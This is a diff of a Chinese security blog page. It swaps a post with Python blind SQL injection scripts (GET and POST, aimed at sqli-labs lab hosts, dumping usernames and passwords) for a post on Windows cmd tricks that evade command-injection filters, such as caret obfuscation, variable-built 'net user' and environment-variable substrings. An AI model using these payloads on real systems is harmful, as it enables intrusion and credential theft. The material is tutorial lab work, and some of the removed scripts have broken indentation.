@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/05/18/SQL%E7%9B%B2%E6%B3%A8-%E4%BA%8C%E5%88%86%E6%B3%95/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/08/16/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/05/18/SQL%E7%9B%B2%E6%B3%A8-%E4%BA%8C%E5%88%86%E6%B3%95/" class="post-title-link" itemprop="url">SQL盲注---二分法</a>
+          <a href="/2022/08/16/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">常见Windows命令执行漏洞绕过过滤的小技巧</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-05-18 10:16:15" itemprop="dateCreated datePublished" datetime="2022-05-18T10:16:15+08:00">2022-05-18</time>
+      <time title="创建时间：2022-08-16 11:04:10" itemprop="dateCreated datePublished" datetime="2022-08-16T11:04:10+08:00">2022-08-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -252,7 +252,7 @@
     </span>
 
   
-    <span id="/2022/05/18/SQL%E7%9B%B2%E6%B3%A8-%E4%BA%8C%E5%88%86%E6%B3%95/" class="post-meta-item leancloud_visitors" data-flag-title="SQL盲注---二分法" title="阅读次数">
+    <span id="/2022/08/16/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="post-meta-item leancloud_visitors" data-flag-title="常见Windows命令执行漏洞绕过过滤的小技巧" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>9k</span>
+      <span>1.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>8 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -283,293 +283,60 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="布尔盲注——GET注入"><a href="#布尔盲注——GET注入" class="headerlink" title="布尔盲注——GET注入"></a>布尔盲注——GET注入</h2><p>一、好家伙，昨天在buu上看到一道SQL注入的题目，贼难受，然后就果断放弃去看大佬们写的wp，所以成功的花了6个小时来学习这个鬼东西，可能是自己太菜了，也可能是小甲鱼python看的太少了……小甲鱼的python的确讲的很不错</p>
-<h3 id="自己写的脚本："><a href="#自己写的脚本：" class="headerlink" title="自己写的脚本："></a>自己写的脚本：</h3><p>二、直接上代码，看不懂来找我（算了，还是别找我了……），这里都是以sqli-labs第八关为例子的。</p>
-<p>（1）获取数据库的长度 </p>
-<pre><code># 导入爬虫模块
-import requests
-# 导入时间模块
-import time
-
-
-# 获取数据库的长度
-def get_DBlen(url):
-    for i in range(1, 20):
-        payload = &quot;&#39; and length(database())=%d -- p&quot; % i
-        html = requests.get(url + payload)
-        if &quot;You&quot; in html.text:
-            print(f&quot;数据库长度为：&#123;i&#125;&quot;)
-            break
-    return i
-
-
-# 获取数据库的库名
-def get_DBname(url, DBlen):
-    DBname = &quot;&quot;
-    DBlen = DBlen + 1
-    for i in range(1, DBlen):
-        for j in range(33, 128): payload = &quot;&#39; and (ascii(substr((select(database())),&#123;0&#125;,1))=&#123;1&#125;) -- p&quot;.format(i, j)
-        db_url = url + payload
-        html = requests.get(db_url)
-        if &quot;You&quot; in html.text:
-            DBname += chr(j)
-            break
-    print(DBname)
-    return DBname
-
-
-# 获取表的长度
-def get_TBlen(url):
-    # 表示数据表的数量
-    TBvalue = 0
-    for j in range(0, 15):
-        payload = &quot;&#39; and length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))&gt;1 -- p&quot;.format(
-            j)
-        db_url = url + payload
-        html = requests.get(db_url)
-        # 如果有回显说明该表存在，存在的话就可以判断该表的长度
-        if &quot;You&quot; in html.text:
-            pass
-        else:
-            TBvalue = j
-            break
-    print(TBvalue)
-    for j in range(0, TBvalue):
-        # print(j)：0,1,2,3
-        for i in range(1, 20):
-            payload = &quot;&#39; and length((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1))=&#123;1&#125; -- p&quot;.format(
-                j, i)
-            db_url = url + payload
-            html = requests.get(db_url)
-            if &quot;You&quot; in html.text:
-                print(f&quot;数据表&#123;j&#125;的长度为&#123;i&#125;&quot;)
-        return TBvalue
-
-
-# 获取表名
-def get_TBname(url, TBlen):
-    TBnameAll = []
-    for i in range(0, TBlen):
-        TBname = &quot;&quot;
-    for j in range(1, 15):
-        min = 32
-    max = 128
-    mid = (max + min) // 2
-    while min &lt; max:
-        payload = &quot;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(
-            i, j, mid)
-        html = requests.get(url + payload)
-        if &quot;You&quot; in html.text:
-            min = mid + 1
-        else:
-            max = mid
-        mid = (max + min) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        TBname += chr(mid)
-        # print(chr(mid))
-        print(TBname)
-        TBnameAll.append(TBname)
-    return TBnameAll
-
-
-# 获取列的列名
-def get_Colname(url):
-    for i in range(0, 15):
-        Colname = &quot;&quot;
-        for j in range(1, 15):
-            min = 32
-            max = 128
-            mid = (min + max) // 2
-    while min &lt; max:
-        payload = &quot;&#39; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;referers&#39; limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(
-            i, j, mid)
-        html = requests.get(url + payload)
-        if &quot;You&quot; in html.text:
-            min = mid + 1
-        else:
-            max = mid
-        mid = (max + min) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        Colname += chr(mid)
-    print(&quot;数据列名为：&quot;, Colname)
-
-
-# 爆数据
-def get_shuju(url):
-    for i in range(0, 15):
-        shuju = &quot;&quot;
-        for j in range(1, 20):
-            min = 32
-        max = 128
-        mid = (min + max) // 2
-        while min &lt; max:
-            payload = &quot;&#39; and ascii(substr((select concat(id,&#39;~&#39;,email_id) from emails limit &#123;0&#125;,1),&#123;1&#125;,1))&gt;&#123;2&#125; -- p&quot;.format(
-                i, j, mid)
-            html = requests.get(url + payload)
-            if &quot;You&quot; in html.text:
-                min = mid + 1
-            else:
-                max = mid
-            mid = (max + min) // 2
-            if mid &lt;= 32 or mid &gt;= 127:
-                break
-            shuju += chr(mid)
-        print(&quot;数据为：&quot;, shuju)
-
-
-if __name__ == &quot;main&quot;:
-    # 要进行SQL盲注的链接    
-    url = &quot;http://192.168.59.150/sqli-labs/Less-8/?id=1&quot;
-    # 数据库的长度    
-    DBlen = get_DBlen(url)
-    # 数据库的库名    
-    DBname = get_DBname(url, DBlen)
-    # 数据表的个数    
-    TBlen = get_TBlen(url)
-    # print(TBlen)    
-    # 表的表名    
-    TBnameAll = get_TBname(url, TBlen)
-    # 返回的是一个列表，表示所有的数据表名    
-    # print(TBnameAll)   
-    get_Colname(url)
-    # 数据   
-    get_shuju(url)
+          <h2 id="一、符号与命令的关系"><a href="#一、符号与命令的关系" class="headerlink" title="一、符号与命令的关系"></a>一、符号与命令的关系</h2><p>在cmd命令中，我们可以使用<code>&quot;</code>、<code>^</code>和<code>()</code>不会影响命令的执行，而且在Windows中命令不会区分大小写。</p>
+<blockquote>
+<p>1.whoami<br>2.w”h”o”a”m”i<br>3.wh^o^ami<br>4.((whoami))</p>
+</blockquote>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-4-1024x248.png"></p>
+<p>这里我们可以同时加多个<code>&quot;</code>，但是不能同时使用多个<code>^^</code>，因为在cmd中<code>^</code>是转义符，跟在他后面的符号会被转义的，所以执行的话会报错。</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-5-1024x90.png"></p>
+<h2 id="二、set命令和Windows变量"><a href="#二、set命令和Windows变量" class="headerlink" title="二、set命令和Windows变量"></a>二、set命令和Windows变量</h2><p>（1）首先set命令可以用来设置一个变量，%相当于引用一个变量（使用%括起来的变量，会引用其变量内的值）</p>
+<blockquote>
+<p>1.set a&#x3D;1<br>2.echo a<br>3.echo %a%</p>
+</blockquote>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-6-1024x98.png"></p>
+<p>我们还可以设置多个变量来绕过过滤</p>
+<blockquote>
+<p>1.set a &#x3D; who<br>2.set b &#x3D; ami<br>%a%%b%</p>
+</blockquote>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-7-1024x87.png"></p>
+<blockquote>
+<p>set a&#x3D;ser&amp;&amp; set b&#x3D;ne&amp;&amp; set c&#x3D;t u &amp;&amp; call %b%%c%%a%<br>&#x2F;&#x2F;在变量中设置空格，最后调用执行命令</p>
+</blockquote>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-8-1024x199.png"></p>
+<p>似乎翻车了，但是可以记一下，应该还是有作用的。</p>
+<p>我们这里还可以自定义一个或多个环境变量，利用环境变量中的字符，提取并拼接出想要的cmd命令。如：<code>cmd /c &quot;set </code>a<code>=ipconfig &amp;&amp; call echo %</code>a<code>%&quot;</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-10-1024x255.png"></p>
+<p>我们还可以定义多个环境变量：<code>cmd /c &quot;set a=ser&amp;&amp; set b=ne&amp;&amp; set c=t u&amp;&amp;call echo %b%%c%%a%&quot;</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-11-1024x159.png"></p>
+<h2 id="三、Windows切割字符串"><a href="#三、Windows切割字符串" class="headerlink" title="三、Windows切割字符串"></a>三、Windows切割字符串</h2><p>Windows中的cmd命令行是存在类似于PHP中的切割字符串的语法。</p>
+<blockquote>
+<p>set a&#x3D;whoami<br>1.%a:<del>0% # 这里表示的是取a中所有字符，也就是whoami<br>2.%a:</del>0,6% # 取出a的值，从第0个开始取，取6个值，也是whoami<br>3.%a:~0,5% # 取五个值，是whoam</p>
+</blockquote>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-12-1024x154.png"></p>
+<p>所以在cmd中截取字符串的语法就是这样的：<code>%变量名:~x,y%</code>，表示的就是从第x个元素开始取，取y个字符</p>
+<p>然后在Windows中有许多自带的环境变量，然后我们可以截取获得一些有用的东西：</p>
+<p>当空格被过滤的时候，我们可以使用<code>net%CommonProgramFiles:~10,1%user</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-13-1024x115.png"></p>
+<p>注：CommonProgramFiles&#x3D;C:\Program Files\Common Files</p>
+<p>当环境变量中没有我们想要的内容，我们还可以自己进行设置：</p>
+<pre><code>set BL=a bcde/$@\&quot;;fgphvlrequst?# 设置这个我们就可以构成一个shell了
 </code></pre>
-<p>运行结果就不放出来了。</p>
-<p>唉，写的比较垃圾，大佬别喷。慢慢改进，好家伙……</p>
-<h3 id="来自大佬的脚本改编："><a href="#来自大佬的脚本改编：" class="headerlink" title="来自大佬的脚本改编："></a>来自大佬的脚本改编：</h3><p>以下是根据大佬的脚本进行更改的，算80%的自动化吧，嗷嗷嗷……</p>
-<pre><code>from operator import le
-import requests
-import time
-
-host = &quot;http://192.168.59.150/sqli-labs/Less-8/?&quot;
-
-
-def getDatabase():
-    # 获取数据库名
-    # 将host变量变为一个全局变量
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        time.sleep(0.3)
-        url = host + &quot;id=1&#39; and (ascii(substr((select(database())),%d,1))&lt;%d) -- p&quot; % (i, mid)
-        res = requests.get(url)
-        # 如果返回的是You，那么就为真的
-        if &quot;You&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-            mid = (low + high) // 2
-            if mid &lt;= 32 or mid &gt;= 127:
-                break
-            ans += chr(mid - 1)
-            print(&quot;database is -&gt; &quot; + ans)
-            # 返回库名
-        return ans
-
-
-def getTable(DBname):
-    # 获取表名
-    global host
-    ans = &quot;&quot;
-    for i in range(1, 1000):
-        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        time.sleep(0.3)
-        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;&#123;0&#125;&#39;)),&#123;1&#125;,1))&lt;&#123;2&#125;) -- p&quot;.format(
-            DBname, i, mid)
-        res = requests.get(url)
-        if &quot;You&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;table is -&gt; &quot; + ans)
-    # 返回表名，此时表名为一个列表    
-    return ans
-
-
-def getColumn(TBname):
-    # 获取列名    
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        time.sleep(0.3)
-        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;&#123;0&#125;&#39;)),&#123;1&#125;,1))&lt;&#123;2&#125;) -- p&quot;.format(
-            TBname, i, mid)
-        res = requests.get(url)
-        if &quot;You&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-        print(&quot;column is -&gt; &quot; + ans)
-    # 返回一个列名    
-    return ans
-
-
-def dumpTable():
-    # 脱裤    
-    global host
-    ans = &#39;&#39;
-    for i in range(1, 1000):        low = 32
-    high = 128
-    mid = (low + high) // 2
-    while low &lt; high:
-        time.sleep(0.3)
-        url = host + &quot;id=1&#39; and (ascii(substr((select(group_concat(username,password))from(users)),%d,1))&lt;%d) -- p&quot; % (
-            i, mid)
-        res = requests.get(url)
-        if &quot;You&quot; in res.text:
-            high = mid
-        else:
-            low = mid + 1
-        mid = (low + high) // 2
-        if mid &lt;= 32 or mid &gt;= 127:
-            break
-        ans += chr(mid - 1)
-    print(&quot;dumpTable is -&gt; &quot; + ans)
-
-
-DBname = getDatabase()
-# print(DBname)
-TBname = getTable(DBname)
-# print(type(TBname))表示是一个字符串，用来测试
-TBnames = []
-TBnames.append(TBname.split(&#39;,&#39;))
-# 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组
-TBnames = TBnames[0]
-# print(TBnames)
-TBlen = len(TBnames)
-for i in range(0, TBlen):
-    TBname = TBnames[i]
-    # print(TBname)    
-    getColumn(TBname)
-    if i == TBlen - 1:
-        break
-dumpTable()
-</code></pre>
-<p>运行结果就不放出来了。</p>
-<h2 id="布尔盲注——POST注入"><a href="#布尔盲注——POST注入" class="headerlink" title="布尔盲注——POST注入"></a>布尔盲注——POST注入</h2><p>直接上代码了：（这里是以sqli-labs第15关为例的）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">host = &quot;http://192.168.59.150/sqli-labs/Less-15/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getDatabase():  # 获取数据库名</span><br><span class="line">    # 将host变量变为一个全局变量</span><br><span class="line">    global host</span><br><span class="line">    ans = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        payload = &quot;admin&#x27; and (ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;) --p&quot;.format(i, mid)</span><br><span class="line">        print(payload)  # 测试</span><br><span class="line">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class="line">        html = requests.post(host, data)</span><br><span class="line">        # 如果返回的是有数据，那么就为真的</span><br><span class="line">        if &quot;flag.jpg&quot; in html.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">            break</span><br><span class="line">        ans += chr(mid - 1)</span><br><span class="line">        print(&quot;database is -&gt; &quot; + ans)</span><br><span class="line">    # 返回库名</span><br><span class="line">    return ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getTable():</span><br><span class="line">    # 获取表名</span><br><span class="line">    global host</span><br><span class="line">    ans = &quot;&quot;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            time.sleep(0.3)</span><br><span class="line">        payload = &quot;admin&#x27; and(ascii(substr((select(group_concat(table_name))from (information_schema.tables)where(table_schema=database())), &#123;0&#125;, 1)) &lt; &#123;1&#125;)-- p&quot;.format(</span><br><span class="line">            i, mid)</span><br><span class="line">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class="line">        html = requests.post(host, data)</span><br><span class="line">        # 如果返回的是有数据，那么就为真的</span><br><span class="line">        if &quot;flag.jpg&quot; in html.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">            break</span><br><span class="line">        ans += chr(mid - 1)</span><br><span class="line">        print(&quot;table is -&gt; &quot; + ans)</span><br><span class="line">    # 返回表名，此时表名为一个列表</span><br><span class="line">    return ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getColumn(TBname):</span><br><span class="line">    # 获取列名</span><br><span class="line">    global host</span><br><span class="line">    ans = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        payload = &quot;admin&#x27; and (ascii(substr((select(group_concat(column_name))from (information_schema.columns)where(table_name=&#x27;&#123;0&#125;&#x27;)), &#123;1&#125;, 1)) &lt; &#123;2&#125;)-- p&quot;.format(</span><br><span class="line">            TBname, i, mid)</span><br><span class="line">        data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class="line">        html = requests.post(host, data)</span><br><span class="line">        # 如果返回的是有数据，那么就为真的</span><br><span class="line">        if &quot;flag.jpg&quot; in html.text:</span><br><span class="line">            high = mid</span><br><span class="line">        else:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">            break</span><br><span class="line">        ans += chr(mid - 1)</span><br><span class="line">        print(&quot;column is -&gt; &quot; + ans)</span><br><span class="line">    # 返回一个列名</span><br><span class="line">    return ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dumpTable():</span><br><span class="line">    # 脱裤</span><br><span class="line">    global host</span><br><span class="line">    ans = &#x27;&#x27;</span><br><span class="line">    for i in range(1, 1000):</span><br><span class="line">        low = 32</span><br><span class="line">        high = 128</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            time.sleep(0.3)</span><br><span class="line">            payload = &quot;admin&#x27; and(ascii(substr((select(group_concat(username, password))from (users)), % d, 1)) &lt; % d)-- p&quot; % (</span><br><span class="line">                i, mid)</span><br><span class="line">            data = &#123;&quot;uname&quot;: payload, &quot;passwd&quot;: &quot;admin&quot;, &quot;submit&quot;: &quot;Submit&quot;&#125;</span><br><span class="line">            html = requests.post(host, data)</span><br><span class="line">            # 如果返回的是有数据，那么就为真的</span><br><span class="line">            if &quot;flag.jpg&quot; in html.text:</span><br><span class="line">                high = mid</span><br><span class="line">            else:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            if mid &lt;= 32 or mid &gt;= 127:</span><br><span class="line">                break</span><br><span class="line">            ans += chr(mid - 1)</span><br><span class="line">            print(&quot;dumpTable is -&gt; &quot; + ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    getDatabase()</span><br><span class="line">    TBname = getTable()</span><br><span class="line">    print(type(TBname))</span><br><span class="line">    # 表示是一个字符串，用来测试</span><br><span class="line">    TBnames = []</span><br><span class="line">    TBnames.append(TBname.split(&#x27;,&#x27;))</span><br><span class="line">    # 因为输出的是一个二元数组，所以使用下面的代码来转为一维数组</span><br><span class="line">    TBnames = TBnames[0]</span><br><span class="line">    print(TBnames)</span><br><span class="line">    TBlen = len(TBnames)</span><br><span class="line">    for i in range(0, TBlen):</span><br><span class="line">        TBname = TBnames[i]</span><br><span class="line">        print(TBname)</span><br><span class="line">        getColumn(TBname)</span><br><span class="line">        if i == TBlen - 1:</span><br><span class="line">            break</span><br><span class="line">        dumpTable()</span><br></pre></td></tr></table></figure>
-
-<p>运行结果就不放出来了。</p>
+<h2 id="四、逻辑运算符在绕过中的作用"><a href="#四、逻辑运算符在绕过中的作用" class="headerlink" title="四、逻辑运算符在绕过中的作用"></a>四、逻辑运算符在绕过中的作用</h2><p><code>|</code>在cmd中，可以连接命令，并且只会执行后面的那条命令</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-14-1024x44.png"></p>
+<p>但是我们使用<code>||</code>的话，只有前面的命令执行失败，才会执行后面的语句</p>
+<p>使用<code>ipconfig || whoami</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-15-1024x389.png"></p>
+<p>使用<code>ping xxx. || whoami</code></p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-16-1024x54.png"></p>
+<p>然后&amp;，前面的命令可以成功也可以失败，都会执行后面的命令</p>
+<p><img src="/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-17-1024x314.png"></p>
+<p>然后<code>&amp;&amp;</code>符号就必须两条命令都为真才会执行</p>
+<p>使用<code>whoami &amp;&amp; ipconfig</code></p>
